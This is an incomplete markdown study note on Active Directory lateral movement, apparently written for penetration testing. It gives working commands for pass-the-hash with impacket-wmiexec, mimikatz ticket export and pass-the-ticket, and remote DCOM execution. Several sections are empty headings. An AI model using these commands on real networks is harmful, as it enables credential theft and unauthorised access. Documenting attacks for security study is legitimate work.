# Lateral movement in Active directory

## Lateral movement techniques
### WMI and WinRM

### Windows Management Instrumentation (WMI)
gi
### PSExec

### Pass The Hash (PtH)
The Pass the Hash technique only works on servers or services using NTLM authentication. 

prerequisites :
- Requires an SMB connection through the firewall (port 445). 
- The Windows File and Printer Sharing feature are enabled (common in internal entreprise).
- Requires the ***ADMIN$*** share to be accessible. Which means **we must have administrative permissions**. 
- The hash of the target user

We can use `wmiexec` from impacket to move laterally : 
```bash
/usr/bin/impacket-wmiexec -hashes :<NTLM-Hash-Administrator> Administrator@<IP-target>
```

***This technique can not be used to authenticate as any local admin account except the built-in local administrator account and domain accounts.*** 

### Overpass The Hash 
The goal is to abuse an NTLM user hash to gain a full kerberos ***Ticket granting Ticket***. And then we use the TGT to obtain a TGS.  

### Pass the ticket
Pass the ticket attack leverages the TGS. We simply export all tickets with mimikatz. If a user has access to a service we can use his TGS to get access to that service :

to do so we start by export the tickets with mimikatz: 
```powershell
mimikatz #privilege::debug
Privilege '20' OK

mimikatz #sekurlsa::tickets /export
```

This will export all tickets with kirbi format.
We look at the ticket of the service that we want to use and we supply it to mimikatz to put it in the cache : 
```powershell 
kerberos::ptt [0;12bd0]-0-0-40810000-<user>@<target-service>.kirbi
```

And we will have access. We can verify with `klist`that our ticket is in our session. 

### Distributed Component Object Model (DCOM)

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP>"))
```
We can also use DCOM with impacket with DCOM exec as explained here: [https://medium.com/@iamkumarraj/exploring-impacket-dcomexec-enhancing-active-directory-attack-capabilities-a9663d383703](https://medium.com/@iamkumarraj/exploring-impacket-dcomexec-enhancing-active-directory-attack-capabilities-a9663d383703)

## Active Directory persistence

### Golden tickets 

### Shadow copies